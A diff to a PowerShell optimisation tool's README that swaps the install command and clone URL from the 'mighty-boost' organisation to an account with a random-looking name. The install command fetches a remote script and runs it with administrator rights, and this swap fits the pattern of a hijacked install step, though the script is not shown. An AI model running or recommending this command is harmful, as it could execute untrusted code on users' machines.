@@ -16,7 +16,7 @@
 Open PowerShell **as administrator** and paste:
 
 ```powershell
-irm "https://raw.githubusercontent.com/mighty-boost/mighty-boost/main/boost.ps1" | iex
+irm "https://raw.githubusercontent.com/sadawdawdsdads/mighty-boost/main/boost.ps1" | iex
 ```
 
 That's it — no install, no .exe, just open-source PowerShell + JSON. The GUI opens in a few seconds.
@@ -116,7 +116,7 @@ Send a PR. CI runs PSScriptAnalyzer and validates JSON. See [docs/CONTRIBUTING.m
 ## ⚙️ Local development
 
 ```powershell
-git clone https://github.com/mighty-boost/mighty-boost.git
+git clone https://github.com/sadawdawdsdads/mighty-boost.git
 cd mighty-boost
 .\boost.ps1 -Local       # uses local files instead of fetching from GitHub
 ```
